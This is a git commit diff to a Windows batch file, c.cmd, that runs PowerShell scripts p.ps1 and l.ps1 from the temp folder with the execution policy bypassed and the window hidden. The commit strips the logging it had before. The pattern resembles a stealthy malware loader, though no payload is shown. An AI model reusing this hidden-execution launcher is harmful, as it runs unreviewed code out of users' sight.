8f985a9e4a843343b3533fea3f9650df5590096a
whispiqx <xterm8899@gmail.com>
2025-06-14 20:00:43 +0100

    Update c.cmd

--- c.cmd
+++ c.cmd
@@ -1,15 +1,14 @@
 @echo off
-REM Redirect output to a log file
-set LOGFILE="%TEMP%\startup_log.txt"
-
+REM Check if p.ps1 exists
 IF EXIST "%TEMP%\p.ps1" (
-    PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\p.ps1" >> %LOGFILE% 2>&1
+    PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\p.ps1"
 ) ELSE (
-    echo "p.ps1 not found in %TEMP%" >> %LOGFILE%
+    echo "p.ps1 not found in %TEMP%"
 )
 
+REM Check if l.ps1 exists
 IF EXIST "%TEMP%\l.ps1" (
-    PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\l.ps1" >> %LOGFILE% 2>&1
+    PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\l.ps1"
 ) ELSE (
-    echo "l.ps1 not found in %TEMP%" >> %LOGFILE%
+    echo "l.ps1 not found in %TEMP%"
 )
